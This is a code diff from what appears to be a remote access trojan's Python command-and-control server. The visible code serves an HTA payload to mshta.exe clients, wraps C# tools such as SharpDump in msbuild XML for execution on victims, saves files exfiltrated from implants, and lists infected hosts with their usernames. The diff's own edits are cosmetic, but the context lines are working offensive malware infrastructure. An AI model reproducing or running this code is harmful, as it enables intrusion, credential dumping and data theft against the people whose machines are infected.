@@ -200,7 +200,7 @@ def send_csharper_msbuild_xml(input_data, ratID):
     return(b64data)
 
 # Parses an operator's "cs" line to the correct format needed in msbuild xml file
-# Example: cs SharpDump.exe arg1 arg2 "third arg" ->  "arg1", "arg2", "third arg" 
+# Example: cs SharpDump.exe arg1 arg2 "third arg" -> "arg1","arg2","third arg"
 def parse_c_sharp_args(argument_string):
     stringlist = []
     stringbuilder = ""
@@ -250,6 +250,7 @@ def serve_server(port=8080):
     def badrat_get(path):
         user_agent = request.headers['User-Agent']
         # Path must be /documents/b.hta AND user agent belongs to mshta.exe
+        # Easy way to serve HTA's
         if("/documents/b.hta" in path and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent):
             return(send_ratcode(ratID))
         elif(verbose):
@@ -295,7 +296,7 @@ def serve_server(port=8080):
             rand = ''.join(random.choice(alpha) for choice in range(10)) 
             with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
                 fd.write(base64.b64decode(post_dict['dl']))
-            print("\n[*] File download from rat " + colors(ratID) + " saved to downloads/" + colors(ratID) + "." + rand)
+            print("\n[*] File download from rat " + colors(ratID) + " saved to " + colors("downloads/" + colors(ratID)) + colors("." + rand))
 
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
@@ -310,6 +311,8 @@ def serve_server(port=8080):
     else:
         print("[*] Starting " + colors("HTTP") + " listener on port " + str(port) + "\n\n")
         app.run(host="0.0.0.0", port=port)
+
+    print("HTA's servable from path: " + colors("/documents/b.hta"))
 
 def get_rats(current=""):
     print("\n    implant id \ttype\tcheck-in\tusername")
